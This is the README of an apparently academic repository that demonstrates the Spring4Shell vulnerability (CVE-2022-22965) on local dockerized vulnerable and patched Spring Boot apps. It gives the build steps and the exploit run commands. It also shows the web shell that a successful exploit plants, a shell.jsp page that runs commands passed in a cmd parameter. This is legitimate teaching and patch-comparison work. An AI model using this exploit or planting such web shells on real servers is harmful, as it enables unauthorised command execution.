# CS4239-Spring4Shell-POC

Proof of concept for CVE-2022-22965 (Spring4Shell) for CS4239 G410 report. Adapted from [this PoC](https://github.com/lunasec-io/Spring4Shell-POC) to demonstrate unpatched & patched behavior.

## Running the demo

There are 2 example programs (dockerized) in this repository with identical source code. One uses a vulnerable version of Spring Boot while the other uses a patched version. Tomcat also released a patch for this vulnerability, but the same vulnerable version of Tomcat is used for this demo to isolate the effects of the Spring patch.

To run demo apps:

```sh
docker compose build
docker compose up
```

- vulnerable:
  - [localhost:8080/helloworld/greeting](http://localhost:8080/helloworld/greeting)
  - tomcat 9.0.56 (vulnerable), spring boot 2.6.3 (depends on vulnerable spring framework 5.3.15)
- patched:
  - [localhost:8081/helloworld/greeting](http://localhost:8081/helloworld/greeting)
  - tomcat 9.0.56 (vulnerable), spring boot 2.6.6 (depends on patched spring framework 5.3.18)

To run exploit:

```sh
# vulnerable
python exploit.py --url "http://localhost:8080/helloworld/greeting"

# patched
python exploit.py --url "http://localhost:8081/helloworld/greeting"
```

If exploit works, a new page that allows us to run commands will be present. Example of running `id`:

```txt
http://localhost:8080/shell.jsp?cmd=id
```

Exploit does not work for patched version - `shell.jsp` is not injected.
